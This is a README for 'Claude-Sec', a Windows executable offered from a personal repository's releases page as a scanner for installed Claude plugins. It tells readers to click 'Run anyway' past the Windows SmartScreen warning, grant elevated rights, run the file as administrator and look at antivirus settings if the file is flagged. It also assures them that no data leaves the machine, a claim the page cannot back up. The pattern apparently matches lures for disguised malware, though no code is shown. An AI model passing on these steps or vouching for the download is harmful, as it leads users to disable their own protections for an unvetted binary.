# 🔍 Claude-Sec - Find Claude plugins on your computer

[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/arindamchakrabortty123/Claude-Sec/releases)

Claude-Sec scans your computer to identify installed Claude connectors and plugins. Security researchers use this data to check for potential vulnerabilities using the claudesec.pluto.security database. This tool streamlines the discovery process by automating the search across your local directories.

## ⚙️ Requirements

*   A computer running Windows 10 or Windows 11.
*   An active internet connection to cross-reference data with the security database.
*   Administrative permissions to access plugin folders.

## 📥 Getting the software

Visit the project release page to download the latest version of the scanner.

[Download Claude-Sec Here](https://github.com/arindamchakrabortty123/Claude-Sec/releases)

1. Navigate to the link provided above.
2. Look for the section labeled Assets.
3. Click the file ending in .exe to start the download.
4. Save the file to your desktop or your Downloads folder.

## 🚀 Running the scanner

1. Find the file you downloaded. 
2. Double-click the Claude-Sec executable file. 
3. If a blue box from Windows appears stating "Windows protected your PC," click the "More info" link.
4. Click the "Run anyway" button that appears.
5. Grant the application permission to make changes if a prompt appears.
6. The application window opens and begins the scan immediately.

## 📊 Understanding the results

The scanner checks your system for known Claude configuration files and plugin directories. It compiles a list of active components. The tool displays these results in a simple list format within the application window. 

*   **Plugin Name:** The identification label for the detected plugin.
*   **Version:** The current version installed on your machine.
*   **Status:** A brief note on whether the plugin is active or disabled.
*   **Identifier:** A unique code used for lookups on the security website.

## 🌐 Security lookups

Once the scan finishes, the tool generates a report. Take the identifier codes provided by the scanner to the official lookup website. Enter these codes into the search bar at claudesec.pluto.security. This website provides detailed information regarding the safety and origin of each plugin detected on your machine. Use this information to ensure your setup remains secure and uses only verified components.

## 🛡️ Privacy and safety

Claude-Sec performs all analysis locally on your machine. The scan process reads your file system to identify paths and configuration data. It does not collect or transmit personal files, documents, or sensitive data to external servers. The tool only sends the plugin identifiers to the lookup service when you perform a search on the website. You remain in control of your data throughout the entire process.

## 🛠️ Troubleshooting common issues

**The file fails to launch**
Ensure you have the latest updates for your Windows operating system. Some security software might flag unknown applications. Check your antivirus settings if the tool does not open after a double-click.

**The scan shows no results**
Verify that you have installed Claude on your system. If you recently installed a plugin, restart the scanner to force a fresh search of your directories.

**Missing permissions error**
The scanner needs read access to your system folders to find plugins. If you see a permission error, close the program and right-click the file. Select "Run as administrator" from the menu.

**Slow performance**
If you have a large hard drive, the scan might take a few moments. Wait for the progress bar to finish before you attempt to read the list.

## 📝 Frequently asked questions

**Do I need a paid account to use this?**
No. This tool is free to use for all users.

**Does this modify my plugins?**
No. This tool only reads information. It does not add, remove, or change any files on your computer.

**How often should I run a scan?**
Run a scan whenever you install a new plugin or when you want to verify the current state of your system security.

**Is this tool compatible with other desktop assistants?**
No. This application focuses specifically on identifying files related to Claude installations.

**Can I run this on a Mac?**
No. This version works exclusively on Windows systems.

**Where does the data go?**
The data stays on your local hard drive. Only the plugin identifiers you choose to check on the website are processed by the external service.

**How do I uninstall it?**
Delete the downloaded executable file from your computer. This removes the tool entirely from your system.